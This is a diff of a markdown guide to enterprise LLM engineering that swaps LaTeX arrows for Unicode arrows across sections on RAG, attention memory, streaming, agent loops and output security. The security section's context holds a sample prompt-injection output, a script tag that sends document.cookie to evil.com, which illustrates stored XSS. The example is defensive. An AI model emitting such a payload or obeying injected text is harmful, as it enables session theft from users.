@@ -49,9 +49,9 @@ When designing enterprise AI systems, engineering teams must choose between thre
 #### 3. Decision Framework & Production Heuristic
 
 A production decision tree follows three critical questions:
-1. **Does the knowledge change frequently (daily/hourly)?** $\rightarrow$ **RAG** is mandatory.
-2. **Is strict source verifiability or audit compliance required?** $\rightarrow$ **RAG** is mandatory (citations to ground truth documents).
-3. **Is the task focused on style, rigid output schema, or specialized syntax rather than novel facts?** $\rightarrow$ **Fine-Tuning** is superior.
+1. **Does the knowledge change frequently (daily/hourly)?** → **RAG** is mandatory.
+2. **Is strict source verifiability or audit compliance required?** → **RAG** is mandatory (citations to ground truth documents).
+3. **Is the task focused on style, rigid output schema, or specialized syntax rather than novel facts?** → **Fine-Tuning** is superior.
 
 ```python
 def choose_llm_strategy(frequently_changing_data: bool, strict_citations_required: bool, custom_syntax_or_style: bool) -> str:
@@ -905,7 +905,7 @@ $$\text{Attention}(Q, K, V) = \text{softmax}\left(\frac{QK^T}{\sqrt{d}}\right)V$
 In standard PyTorch implementations:
 1. $QK^T$ materializes an $N \times N$ intermediate matrix in GPU High-Bandwidth Memory (HBM).
 2. For an 8,000-token sequence, $N \times N = 64,000,000$ elements.
-3. For a 64,000-token sequence, $N \times N = 4,096,000,000$ elements $\rightarrow$ **Out of Memory (OOM)** crash!
+3. For a 64,000-token sequence, $N \times N = 4,096,000,000$ elements → **Out of Memory (OOM)** crash!
 
 ```
 Standard Attention: Slow HBM Thrashing
@@ -947,7 +947,7 @@ Because autoregressive models generate text sequentially at ~30–80 tokens per 
 
 | Protocol | Connection Type | Multiplexing | Browser Overhead | Ideal Use Case |
 | :--- | :--- | :--- | :--- | :--- |
-| **Server-Sent Events (SSE)** | Unidirectional (Server $\rightarrow$ Client) over HTTP/2 | High (reuses HTTP/2 connection) | Very Low (`EventSource` or `fetch` with `ReadableStream`) | **Industry Standard** for LLM chat completions |
+| **Server-Sent Events (SSE)** | Unidirectional (Server → Client) over HTTP/2 | High (reuses HTTP/2 connection) | Very Low (`EventSource` or `fetch` with `ReadableStream`) | **Industry Standard** for LLM chat completions |
 | **WebSockets** | Full-Duplex (Bidirectional) | Requires dedicated TCP connection | High (custom heartbeat & reconnect logic) | Audio/Video Live API (e.g. Gemini Live, OpenAI Realtime) |
 | **HTTP Long Polling** | Unidirectional HTTP/1.1 | None | Very High | Obsolete for LLM applications |
 
@@ -1255,7 +1255,7 @@ await server.connect(transport);
 #### 1. Directed Acyclic Graphs (DAGs) vs. Cyclical State Machines
 
 Early agent frameworks (LangChain chains, AutoGPT) ran simple linear DAGs. Real-world enterprise workflows are inherently **cyclical**:
-- Write code $\rightarrow$ Run test $\rightarrow$ Test fails $\rightarrow$ Loop back to fix code $\rightarrow$ Re-test $\rightarrow$ Pass $\rightarrow$ Deploy.
+- Write code → Run test → Test fails → Loop back to fix code → Re-test → Pass → Deploy.
 
 ```
                 ┌──────────────────────────────────────────────┐
@@ -1701,9 +1701,9 @@ Traditional injection defenses (SQL parameterized queries) work because code and
 #### 1. The Fallacy of "Safe" LLM Outputs
 
 A common enterprise security mistake is treating LLM-generated output as trusted internal data:
-- If an LLM response is rendered directly in an admin dashboard without HTML escaping $\rightarrow$ **Stored Cross-Site Scripting (XSS)**.
-- If an LLM generates a database query concatenated directly into an SQL string $\rightarrow$ **SQL Injection (SQLi)**.
-- If an LLM writes shell commands executed directly via `exec()` $\rightarrow$ **Remote Code Execution (RCE)**.
+- If an LLM response is rendered directly in an admin dashboard without HTML escaping → **Stored Cross-Site Scripting (XSS)**.
+- If an LLM generates a database query concatenated directly into an SQL string → **SQL Injection (SQLi)**.
+- If an LLM writes shell commands executed directly via `exec()` → **Remote Code Execution (RCE)**.
 
 ```
 Malicious Prompt Injection ──► LLM Output: "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
@@ -1892,8 +1892,8 @@ When enterprise software blindly trusts LLM outputs in legal, healthcare, or fin
 For high-stakes reasoning (e.g., medical dosage calculation or complex tax logic):
 1. Sample the prompt 5 times at temperature $T = 0.7$.
 2. Compare the 5 independent outputs:
-   - If 5/5 or 4/5 outputs converge on the same conclusion $\rightarrow$ **High Confidence**.
-   - If outputs diverge (2 said Yes, 3 said No) $\rightarrow$ **Low Confidence: Route to Human Expert**.
+   - If 5/5 or 4/5 outputs converge on the same conclusion → **High Confidence**.
+   - If outputs diverge (2 said Yes, 3 said No) → **Low Confidence: Route to Human Expert**.
 
 ### 37. PII Redaction & Data Sanitization: Presidio, Token Replacement & Differential Privacy
 
